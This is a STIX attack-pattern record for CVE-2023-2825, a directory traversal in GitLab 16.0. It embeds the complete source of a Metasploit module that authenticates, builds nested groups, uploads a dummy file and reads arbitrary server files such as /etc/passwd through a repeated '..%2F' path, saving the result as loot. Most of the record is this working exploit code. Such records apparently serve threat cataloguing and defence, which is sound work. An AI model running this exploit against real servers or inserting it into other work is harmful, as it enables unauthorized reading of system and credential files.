{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--475ef367-47fa-4c77-96b7-0cdb0d989ad9",
    "created": "2024-08-14T16:31:34.864158Z",
    "modified": "2024-08-14T16:31:34.864162Z",
    "name": "GitLab Authenticated File Read",
    "description": " GitLab version 16.0 contains a directory traversal for arbitrary file read as the `gitlab-www` user. This module requires authentication for exploitation. In order to use this module, a user must be able to create a project and groups. When exploiting this vulnerability, there is a direct correlation between the traversal depth, and the depth of groups the vulnerable project is in. The minimum for this seems to be 5, but up to 11 have also been observed. An example of this, is if the directory traversal needs a depth of 11, a group and 10 nested child groups, each a sub of the previous, will be created (adding up to 11). Visually this looks like: Group1->sub1->sub2->sub3->sub4->sub5->sub6->sub7->sub8->sub9->sub10. If the depth was 5, a group and 4 nested child groups would be created. With all these requirements satisfied a dummy file is uploaded, and the full traversal is then executed. Cleanup is performed by deleting the first group which cascades to deleting all other objects created. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/gather/gitlab_authenticated_subgroups_file_read.rb",
            "external_id": "gitlab_authenticated_subgroups_file_read.rb"
        },
        {
            "source_name": "reference",
            "url": "https://about.gitlab.com/releases/2023/05/23/critical-security-release-gitlab-16-0-1-released/"
        },
        {
            "source_name": "reference",
            "url": "https://github.com/Occamsec/CVE-2023-2825"
        },
        {
            "source_name": "reference",
            "url": "https://labs.watchtowr.com/gitlab-arbitrary-file-read-gitlab-cve-2023-2825-analysis/"
        },
        {
            "source_name": "CVE",
            "external_id": "2023-2825"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::Remote::HTTP::Gitlab\n  include Msf::Auxiliary::Report\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'GitLab Authenticated File Read',\n        'Description' => %q{\n          GitLab version 16.0 contains a directory traversal for arbitrary file read\n          as the `gitlab-www` user. This module requires authentication for exploitation.\n          In order to use this module, a user must be able to create a project and groups.\n          When exploiting this vulnerability, there is a direct correlation between the traversal\n          depth, and the depth of groups the vulnerable project is in. The minimum for this seems\n          to be 5, but up to 11 have also been observed. An example of this, is if the directory\n          traversal needs a depth of 11, a group\n          and 10 nested child groups, each a sub of the previous, will be created (adding up to 11).\n          Visually this looks like:\n          Group1->sub1->sub2->sub3->sub4->sub5->sub6->sub7->sub8->sub9->sub10.\n          If the depth was 5, a group and 4 nested child groups would be created.\n          With all these requirements satisfied a dummy file is uploaded, and the full\n          traversal is then executed. Cleanup is performed by deleting the first group which\n          cascades to deleting all other objects created.\n        },\n        'Author' => [\n          'h00die', # MSF module\n          'pwnie', # Discovery on HackerOne\n          'Vitellozzo' # PoC on Github\n        ],\n        'References' => [\n          ['URL', 'https://about.gitlab.com/releases/2023/05/23/critical-security-release-gitlab-16-0-1-released/'],\n          ['URL', 'https://github.com/Occamsec/CVE-2023-2825'],\n          ['URL', 'https://labs.watchtowr.com/gitlab-arbitrary-file-read-gitlab-cve-2023-2825-analysis/'],\n          ['CVE', '2023-2825']\n        ],\n        'DisclosureDate' => '2023-05-23',\n        'License' => MSF_LICENSE,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [],\n          'SideEffects' => [IOC_IN_LOGS]\n        }\n      )\n    )\n\n    register_options(\n      [\n        OptString.new('USERNAME', [true, 'The username to authenticate as', nil]),\n        OptString.new('PASSWORD', [true, 'The password for the specified username', nil]),\n        OptInt.new('DEPTH', [ true, 'Depth for Path Traversal (also groups creation)', 11]),\n        OptString.new('FILE', [true, 'File to read', '/etc/passwd'])\n      ]\n    )\n    deregister_options('GIT_URI')\n  end\n\n  def get_csrf(body)\n    if body.empty?\n      fail_with(Failure::UnexpectedReply, \"HTML response had an empty body, couldn't find CSRF, unable to continue\")\n    end\n\n    body =~ /\"csrf-token\" content=\"([^\"]+)\"/\n\n    if ::Regexp.last_match(1).nil?\n      fail_with(Failure::UnexpectedReply, 'CSRF token not found in response, unable to continue')\n    end\n    ::Regexp.last_match(1)\n  end\n\n  def check\n    # check method almost entirely borrowed from gitlab_github_import_rce_cve_2022_2992\n    @cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD'])\n\n    raise Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError if @cookie.nil?\n\n    vprint_status('Trying to get the GitLab version')\n\n    version = Rex::Version.new(gitlab_version)\n\n    if version != Rex::Version.new('16.0.0')\n      return CheckCode::Safe(\"Detected GitLab version #{version} which is not vulnerable\")\n    end\n\n    report_vuln(\n      host: rhost,\n      name: name,\n      refs: references,\n      info: [version]\n    )\n\n    return Exploit::CheckCode::Appears(\"Detected GitLab version #{version} which is vulnerable.\")\n  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError\n    return Exploit::CheckCode::Detected('Could not detect the version because authentication failed.')\n  rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::ClientError => e\n    return Exploit::CheckCode::Unknown(\"#{e.class} - #{e.message}\")\n  end\n\n  def run\n    if datastore['DEPTH'] < 5\n      print_bad('A DEPTH of < 5 is unlikely to succeed as almost all observed installs require 5-11 depth.')\n    end\n\n    begin\n      @cookie = gitlab_sign_in(datastore['USERNAME'], datastore['PASSWORD']) if @cookie.nil?\n    rescue Msf::Exploit::Remote::HTTP::Gitlab::Error::AuthenticationError\n      fail_with(Failure::NoAccess, 'Unable to authenticate, check credentials')\n    end\n\n    fail_with(Failure::NoAccess, 'Unable to retrieve cookie') if @cookie.nil?\n\n    # get our csrf token\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path)\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n    csrf_token = get_csrf(res.body)\n    vprint_good(\"CSRF Token: #{csrf_token}\")\n\n    # create nested groups to the appropriate depth\n    print_status(\"Creating #{datastore['DEPTH']} groups\")\n    parent_id = ''\n    first_group = ''\n    (1..datastore['DEPTH']).each do |_|\n      name = Rex::Text.rand_text_alphanumeric(8, 10)\n      if first_group.empty?\n        first_group = name\n        vprint_status(\"Creating group: #{name}\")\n      else\n        vprint_status(\"Creating child group: #{name} with parent id: #{parent_id}\")\n      end\n      # a success will give a 302 and direct us to /<group_name>\n      res = send_request_cgi!({\n        'uri' => normalize_uri(target_uri.path, 'groups'),\n        'method' => 'POST',\n        'vars_post' => {\n          'group[parent_id]' => parent_id,\n          'group[name]' => name,\n          'group[path]' => name,\n          'group[visibility_level]' => 20,\n          'user[role]' => 'software_developer',\n          'group[jobs_to_be_done]' => '',\n          'authenticity_token' => csrf_token\n        }\n      })\n      fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n      csrf_token = get_csrf(res.body)\n      vprint_good(\"CSRF Token: #{csrf_token}\")\n\n      # grab our parent group ID for nesting\n      res.body =~ /data-clipboard-text=\"([^\"]+)\" type=\"button\" title=\"Copy group ID\"/\n      parent_id = ::Regexp.last_match(1)\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Cannot retrieve the parent ID from the HTML response\") unless parent_id\n    end\n\n    # create a new project\n\n    project_name = Rex::Text.rand_text_alphanumeric(8, 10)\n    print_status(\"Creating project #{project_name}\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, 'projects'),\n      'method' => 'POST',\n      'vars_post' => {\n        'project[ci_cd_only]' => 'false',\n        'project[name]' => project_name,\n        'project[selected_namespace_id]' => parent_id,\n        'project[namespace_id]' => parent_id,\n        'project[path]' => project_name,\n        'project[visibility_level]' => 20,\n        'project[initialize_with_readme]' => 1, # The POC is missing a ] here, fingerprintable?\n        'authenticity_token' => csrf_token\n      }\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 302\n\n    project_id = URI(res.headers['Location']).path\n\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, project_id)\n    })\n    csrf_token = get_csrf(res.body)\n\n    # upload a dummy file\n    print_status('Creating a dummy file in project')\n    file_name = Rex::Text.rand_text_alphanumeric(8, 10)\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, project_id, 'uploads'),\n      'method' => 'POST',\n      'headers' => {\n        'X-CSRF-Token' => csrf_token,\n        'Accept' => '*/*' # required or you get a 404\n      },\n      'vars_form_data' => [\n        {\n          'name' => 'file',\n          'filename' => file_name,\n          'data' => Rex::Text.rand_text_alphanumeric(4, 25)\n        }\n      ]\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 200\n    res = res.get_json_document\n    file_url = res.dig('link', 'url')\n    if file_url.nil?\n      fail_with(Failure::UnexpectedReply, \"#{peer} - Unable to determine file upload URL, possible permissions issue\")\n    end\n    # remove our file name\n    file_url = file_url.gsub(\"/#{file_name}\", '')\n\n    # finally, read our file\n    print_status('Executing dir traversal')\n    target_file = datastore['FILE']\n    target_file = target_file.gsub('/', '%2F')\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, project_id, file_url, '..%2F' * datastore['DEPTH'] + \"..#{target_file}\"),\n      'headers' => {\n        'Accept' => '*/*' # required or you get a 404\n      }\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    if res.code == 500\n      print_error(\"Unable to read file (permissions, or file doesn't exist)\")\n    elsif res.code != 200\n      print_error(\"#{peer} - Unexpected response code (#{res.code})\") # don't fail_with so we can cleanup\n    end\n\n    if res.body.empty?\n      print_error('Response has 0 size.')\n    elsif res.code == 200\n      print_good(res.body)\n      loot_path = store_loot('GitLab file', 'text/plain', datastore['RHOST'], res.body, datastore['FILE'])\n      print_good(\"#{datastore['FILE']} saved to #{loot_path}\")\n    else\n      print_error('Bad response, initiating cleanup')\n    end\n\n    # deleting the first group will delete the sub-groups and project\n    print_status(\"Deleting group #{first_group}\")\n    res = send_request_cgi({\n      'uri' => normalize_uri(target_uri.path, first_group),\n      'method' => 'POST',\n      'vars_post' => {\n        'authenticity_token' => csrf_token,\n        '_method' => 'delete'\n      }\n    })\n    fail_with(Failure::Unreachable, \"#{peer} - Could not connect to web service - no response\") if res.nil?\n    fail_with(Failure::UnexpectedReply, \"#{peer} - Unexpected response code (#{res.code})\") unless res.code == 302\n  end\nend\n",
    "x_mitre_disclosure_date": "2023-05-23"
}